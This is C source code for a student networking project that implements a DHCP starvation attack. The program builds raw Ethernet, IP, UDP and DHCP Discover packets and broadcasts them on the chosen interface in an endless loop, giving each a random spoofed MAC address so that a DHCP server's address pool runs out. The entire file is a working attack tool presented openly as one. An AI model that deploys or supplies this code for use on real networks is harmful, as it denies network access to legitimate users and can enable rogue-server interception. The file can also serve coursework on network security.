/*
 *  Author:   Tomas Zubrik, xzubri00
 *  Subject:  IPK, FIT VUT Brno 2018
 *  Project:  DHCP Starvation Attack (2st Project 2nd Variant) 
 */

#include "dhcp.h"

int main(int argc, char **argv)
{
  //check input argumetns
  check_args(argc, argv, &interface);

  //get raw socket for sending discover messages
  if ((dhcp_socket = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)) == ERROR) {
      perror("Socket function: ");
  }

  //get index and mac address of interface
  if((get_interface(dhcp_socket, interface))==ERROR){
    exit_with_error("Wrong interface !");
  }

  //create Discover Message structure
  create_ether_header();
  struct iphdr *iph = create_ip_header();
  struct udphdr *udph = create_udp_header();
  dhcp_packet * pcktptr = create_dhcp_msg_payload(generate_mac_address(client_mac_addr));

  udph->len = htons(packet_size - eth_header_size - ip_header_size);
  iph->tot_len = htons(packet_size - eth_header_size);
  iph->check = check_sum((unsigned short *)(buffer + eth_header_size), ip_header_size/2);

  //set variables for sending message
  struct sockaddr_ll dhcp_sock_addr;
  dhcp_sock_addr.sll_ifindex = if_idx.ifr_ifindex;
  dhcp_sock_addr.sll_halen = ETH_ALEN; 
  dhcp_sock_addr.sll_pkttype = PACKET_BROADCAST;
  memcpy(dhcp_sock_addr.sll_addr, macff, MAC_LEN);

  while(1)
  {
    memcpy(pcktptr->chaddr, generate_mac_address(client_mac_addr), MAC_LEN);
    if (sendto(dhcp_socket, buffer, packet_size, 0, (struct sockaddr*)&dhcp_sock_addr, sockaddr_ll_size) < 0)
        printf("Send failed\n");
}
  return 0;
}

//debuging function
void print_mac_address(unsigned char *client_mac_addr){
  for (int i = 0; i < MAC_LEN; i++) {
    printf("%02X%s", client_mac_addr[i], i<5? ":" : "\n");
  }
}


int get_interface(int dhcp_socket, char *inteface)
{
  //zero the buffer
  memset(buffer, 0, BUFFERSIZE);
  memset(&if_idx, 0, interface_size);
  strncpy(if_idx.ifr_name, interface, IFNAMSIZ-1);
  if (ioctl(dhcp_socket, SIOCGIFINDEX, &if_idx) < 0){
      perror("SIOCGIFINDEX");
      return ERROR;
  }

  memset(&if_mac, 0, interface_size);
  strncpy(if_mac.ifr_name, interface, IFNAMSIZ-1);
  if (ioctl(dhcp_socket, SIOCGIFHWADDR, &if_mac) < 0){
      perror("SIOCGIFHWADDR");
      return ERROR;
  }
  return 0;
}

unsigned char * generate_mac_address(unsigned char *client_mac_addr){
  for (int i = 0; i < MAC_LEN; i++) {
    client_mac_addr[i] = (unsigned char)rand() % 256;
  }
  return client_mac_addr;
}

void create_ether_header()
{
  struct ether_header *etherheader = (struct ether_header *) buffer;
  memcpy(&etherheader->ether_shost, if_mac.ifr_hwaddr.sa_data, MAC_LEN);
  memcpy(&etherheader->ether_dhost, macff, MAC_LEN);
  etherheader->ether_type = htons(ETH_P_IP);
  packet_size += eth_header_size;
}

struct iphdr * create_ip_header()
{
  struct iphdr *iph = (struct iphdr *) (buffer + eth_header_size);
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 16; 
  iph->id = htons(54321);
  iph->ttl = 128; 
  iph->protocol = 17; // UDP
  iph->saddr = inet_addr("0.0.0.0");
  iph->daddr = inet_addr("255.255.255.255");
  packet_size += ip_header_size;
  return iph;
}

struct udphdr * create_udp_header()
{
  struct udphdr *udph = (struct udphdr *) (buffer + ip_header_size + eth_header_size);
  udph->source = htons(68);
  udph->dest = htons(67);
  udph->check = 0; 
  packet_size += udp_header_size;
  return udph;
}

dhcp_packet * create_dhcp_msg_payload(unsigned char *client_mac_addr)
{
  dhcp_packet *discover_packet = (dhcp_packet *) (buffer + ip_header_size + eth_header_size + udp_header_size);
  discover_packet->op=BOOT_REQ;         // boot request flag (backward compatible with BOOTP servers) 
  discover_packet->htype=ETH_ADD_TYPE;  // hardware address type 
  discover_packet->hlen=MAC_LEN;        // length of our hardware address 
  discover_packet->hops=0;
  discover_packet->xid=htonl(rand());   ntohl(discover_packet->xid);
  discover_packet->secs=0;              //discover_packet.secs=htons(65535);
  discover_packet->flags=htons(DHCP_BROADCAST);  // tell server it should broadcast its response 
  memcpy(&discover_packet->chaddr,client_mac_addr,MAC_LEN);  // our hardware address 
  discover_packet->options[0] = 0x63;
  discover_packet->options[1] = 0x82;
  discover_packet->options[2] = 0x53;
  discover_packet->options[3] = 0x63;
  discover_packet->options[4] = 53;    // DHCP message type option identifier 
  discover_packet->options[5] = sizeof(uint8_t);               // DHCP message option length in bytes 
  discover_packet->options[6] = DHCP_DISCOVER;
  discover_packet->options[7] = 0xff;

  packet_size += discover_msg_payload_size;
  return discover_packet;
}

unsigned short check_sum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void exit_with_error(char *info)
{
  fprintf (stderr, "ERR ... %s\n", info);
  exit(ERROR);
}

void check_args(int argc, char **argv, char **interface)
{
  int c;
  while ((c = getopt (argc, argv, "i:")) != ERROR)
  {   
      switch (c)
      {
          case 'i':
            (*interface) = optarg;  
            break;

          case '?':
            switch(optopt)
            {
              case 'i': 
                exit_with_error("Option [-i] require an argument 'char *interface'.");  
                break;
            }
            exit_with_error("Option [-i] require an argument 'char *interface'.");  
        }
    }
    if(argc != 3)
    {
      exit_with_error("Option [-i] require an argument 'char *interface'.");  
    }
}
